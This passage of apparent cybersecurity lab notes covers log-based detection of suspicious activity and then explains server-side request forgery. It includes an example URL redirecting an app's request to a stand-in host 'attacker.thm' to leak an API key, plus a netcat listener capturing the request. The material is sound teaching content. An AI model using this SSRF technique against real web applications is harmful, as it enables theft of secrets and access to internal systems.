- Multiple **unauthorized attempts** (e.g., failed login attempts, access to admin pages)  
- Requests from **anomalous IP addresses or locations**  
- Use of **automated tools** (detected via User-Agent headers or request speed)  
- Use of **common attack payloads**  

---

## Responding to Suspicious Activity  

- Detection alone is not enough → rate suspicious activity according to **impact level**.  
- High-impact actions → raise alarms to alert relevant teams immediately.  
- Example: Multiple failed admin login attempts = high-impact → immediate response required.  

---

## Practice  

- Analyse sample log files to detect suspicious activity.  
- Download sample logs via the task file or provided link.  

---
# Server-Side Request Forgery (SSRF)  

SSRF occurs when an attacker can **coerce a web application** into sending requests on their behalf to arbitrary destinations.  
The attacker can also **control the contents of the request**.  

SSRF often arises when a web application interacts with **third-party services**.  

---

## Example Scenario  

- Web app uses an **external API** to send SMS notifications.  
- Each request includes a **secret API key** to authenticate the sender.  

Vulnerability:  
- The web app exposes a parameter (e.g., `server`) to the user.  
- The attacker can change this parameter to point to their own server.  
- The web app forwards the request, revealing the API key to the attacker.  

### Attack Example  

User request to vulnerable web app:  

https://www.mysite.com/sms?server=attacker.thm&msg=ABC

Web app sends request to attacker-controlled server:  

https://attacker.thm/api/send?msg=ABC

Capture request with Netcat:  

nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: /

---

## Potential Impact  

Depending on the scenario, SSRF can be used to:  

- Enumerate internal networks (IP addresses and ports).  
- Abuse **trust relationships** between servers to access restricted services.  
- Interact with **non-HTTP services** to potentially achieve **remote code execution (RCE)**.  

---

## Practical Example  

- Navigate to: `http://10.201.112.84:8087/`  
- Explore the simple web application.  
- Identify the **admin area**, which is the main objective.  
- Follow instructions to gain access to the restricted area using SSRF.
---
